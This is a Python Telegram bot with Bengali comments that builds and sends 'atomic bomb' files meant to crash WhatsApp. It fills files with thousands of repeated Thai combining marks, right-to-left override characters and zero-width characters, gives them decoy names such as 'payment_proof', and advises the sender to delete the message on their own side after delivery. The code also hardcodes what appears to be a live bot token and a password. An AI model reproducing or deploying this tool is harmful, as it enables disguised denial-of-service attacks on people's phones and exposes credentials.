import logging
import os
import sqlite3
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Application, MessageHandler, filters, ContextTypes, ConversationHandler

# ১. লগিং সেটআপ (এরর ট্র্যাকিং)
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# ২. কনফিগারেশন (আপনার টোকেন এবং পাসওয়ার্ড)
TOKEN = "8675593212:AAG6_m5ZFEqG-qkutygxbuoOetMv9N87TnY"
CORRECT_PASSWORD = "MIZANUR RAHMAN"

# স্টেট হ্যান্ডলিং
WAITING_FOR_PASSWORD = 1
WAITING_FOR_FILENAME = 2

# ৩. ডাটাবেস সেটআপ
def init_db():
    conn = sqlite3.connect('m_r_dev_atomic.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, total_bombs INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, total_bombs) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. মেইন এটমিক পেলোড জেনারেটর (No-Default Logic)
async def generate_atomic_payload(filename, status_msg):
    # এখানে কোনো এক্সটেনশন থাকবে না, যাতে ব্রাউজার ধরতে না পারে
    file_path = filename.strip().replace(" ", "_")
    
    # এটি হোয়াটসঅ্যাপের রেন্ডারিং ইঞ্জিনকে ধ্বংস করার জন্য বিশেষ ক্যারেক্টার কম্বিনেশন
    # এতে RTL, Thai লুপ এবং ইনভিজিবল জ্যাম ব্যবহার করা হয়েছে
    payload_chunk = (
        "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 300 + 
        "\u202E\u202D" * 200 +                             
        "\u200B\u200C\u200D\uFEFF" * 250 +                 
        "☢️_CRASH_BY_M_R_DEVELOPER_☢️" * 10
    )
    
    full_payload = (payload_chunk + "\n") * 25  # ফাইলের ডেনসিটি বাড়ানো হয়েছে

    try:
        await status_msg.edit_text(f"🚀 পারমাণবিক শক্তি ইনজেক্ট করা হচ্ছে: {file_path}...")
        # ফাইলটি বাইনারি মোডে রাইট করা হচ্ছে যাতে সিস্টেম কনফিউজড থাকে
        with open(file_path, "w", encoding="utf-8") as f:
            for _ in range(20): # ফাইলের সাইজ ১.৫ - ২ এমবি করার জন্য লুপ
                f.write(full_payload)
        return file_path
    except Exception as e:
        logging.error(f"Error: {e}")
        return None

# ৫. বট ফাংশনসমূহ
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [KeyboardButton("🚀 CREATE ATOMIC BOMB (NO-DEFAULT)")],
        [KeyboardButton("📊 BOT STATUS")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "🔥 **M R DEVELOPER ATOMIC PANEL v3.0** 🔥\n\n"
        "এই বট এমন ফাইল বানাবে যা ব্রাউজারে ওপেন হবে না।\n"
        "সরাসরি হোয়াটসঅ্যাপের ভেতর কাজ করবে।",
        reply_markup=reply_markup
    )
    return ConversationHandler.END

async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔑 **নিরাপত্তা যাচাই:**\nআপনার সিক্রেট পাসওয়ার্ডটি টাইপ করুন।",
        reply_markup=ReplyKeyboardRemove()
    )
    return WAITING_FOR_PASSWORD

async def check_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == CORRECT_PASSWORD:
        await update.message.reply_text("✅ এক্সেস গ্রান্টেড! এখন ফাইলের একটি নাম দিন।\n(যেমন: `payment_proof` বা `transaction_list`)")
        return WAITING_FOR_FILENAME
    else:
        await update.message.reply_text("❌ ভুল পাসওয়ার্ড! আবার চেষ্টা করুন বা /start দিন।")
        return WAITING_FOR_PASSWORD

async def create_and_send_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_filename = update.message.text
    status_message = await update.message.reply_text("☢️ জেনারেটিং পেলোড...")
    
    # জেনারেট ফাইল
    file_path = await generate_atomic_payload(user_filename, status_message)
    
    if file_path and os.path.exists(file_path):
        try:
            with open(file_path, 'rb') as document:
                await update.message.reply_document(
                    document=document,
                    caption=(
                        f"✅ **BOMB READY!**\n\n"
                        f"👤 Dev: M R DEVELOPER\n"
                        f"📁 File: `{file_path}`\n\n"
                        f"💡 **টিপস:** এটি পাঠানোর পর ডাবল টিক উঠলে নিজের চ্যাট থেকে 'Delete for me' করে দিন।"
                    )
                )
            
            # ডাটাবেস আপডেট
            conn = sqlite3.connect('m_r_dev_atomic.db')
            cur = conn.cursor()
            cur.execute("UPDATE stats SET total_bombs = total_bombs + 1 WHERE id=1")
            conn.commit()
            conn.close()

        except Exception as e:
            await update.message.reply_text(f"❌ ফাইল পাঠাতে সমস্যা হয়েছে: {e}")
        finally:
            if os.path.exists(file_path):
                os.remove(file_path) # সার্ভার ক্লিন রাখার জন্য
    else:
        await update.message.reply_text("❌ ফাইল তৈরি করতে ব্যর্থ হয়েছে!")
    
    await status_message.delete()
    return ConversationHandler.END

async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = sqlite3.connect('m_r_dev_atomic.db')
    cur = conn.cursor()
    cur.execute("SELECT total_bombs FROM stats WHERE id=1")
    count = cur.fetchone()[0]
    conn.close()
    await update.message.reply_text(f"📊 **বট স্ট্যাটাস:**\n\nমোট পারমাণবিক বোমা তৈরি হয়েছে: {count} টি।")

# ৬. মেইন ফাংশন
def main():
    init_db()
    application = Application.builder().token(TOKEN).build()

    # কনভারসেশন হ্যান্ডলার
    conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^🚀 CREATE ATOMIC BOMB \(NO-DEFAULT\)$'), ask_password)],
        states={
            WAITING_FOR_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_password)],
            WAITING_FOR_FILENAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_and_send_bomb)],
        },
        fallbacks=[MessageHandler(filters.COMMAND, start)],
    )

    application.add_handler(conv_handler)
    application.add_handler(MessageHandler(filters.Regex('^/start$'), start))
    application.add_handler(MessageHandler(filters.Regex('^📊 BOT STATUS$'), show_stats))

    print("✅ M R DEVELOPER BOT IS RUNNING...")
    application.run_polling()

if __name__ == '__main__':
    main()
    
